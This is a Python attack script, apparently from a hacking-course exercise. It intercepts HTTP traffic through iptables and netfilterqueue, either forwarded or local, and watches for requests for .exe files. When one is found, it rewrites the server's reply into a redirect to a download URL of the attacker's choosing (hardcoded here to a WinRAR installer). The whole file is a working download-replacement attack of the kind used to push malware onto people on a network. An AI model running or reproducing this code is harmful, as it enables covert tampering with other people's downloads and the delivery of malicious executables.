#!/usr/bin/env python3

# @Author - Avish Dhirawat
# Date - 16/08/2020

import netfilterqueue
import subprocess
import scapy.all as scapy
import argparse

ack_list = []

def get_arguments(): # Function to get arguments in command line
    parser = argparse.ArgumentParser()
    parser.add_argument('-c', '--choice', dest = "choice", help = "Choice for Intersystem Spoofing(1) and Intrasystem Spoofing(2)")
    parser.add_argument('-d', '--destination', dest = "destination_website", help = "Destination website you want to forward the target")
    options = parser.parse_args()
    if options.choice not in [1,2,"1","2"]:
        parser.error("[-] Please enter correct options for choice, use --help for more info")
    elif not options.destination_website:
        parser.error("[-] Please specify the destination IP, use --help for more info")
    else:
        return options

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload()) # Coverting the packet to scapy packet so that we can interact with them.
    if scapy_packet.haslayer(scapy.Raw): # Finding the DNS for specific site
        if scapy_packet[scapy.TCP].dport == 80:
            #print("HTTP Request")
            if ".exe" in scapy_packet[scapy.Raw].load:
                print("[+] exe Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)
                #print(scapy_packet.show())
        elif scapy_packet[scapy.TCP].sport == 80:
            #print("HTTP Response")
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file")
                #print(scapy_packet.show())
                scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation : https://www.rarlab.com/rar/winrar-x64-591.exe\n\n"#+str(destination_website)
                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.TCP].chksum
                packet.set_payload(str(scapy_packet))

    packet.accept()

try:
    options = get_arguments()
    choice = options.choice
    destination_website = options.destination_website

    if(choice == 1 or choice == "1"): # Had to add "or" condition so that it supports both python2 and python3
        subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell = True)
        print("\n[+] Created IPTABLE for FORWARD\n")
    elif(choice == 2 or choice == "2"):
        subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 0", shell = True)
        subprocess.call("iptables -I INPUT -j NFQUEUE --queue-num 0", shell = True)
        print("\n[+] Created iptable for INPUT and OUTPUT\n")
    else:
        print("[-] Invalid Choice.... Exiting.....")
        exit()


    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    print("\n[-] Detected CTRL+C........ Exiting... ....")
    subprocess.call("iptables --flush", shell = True)
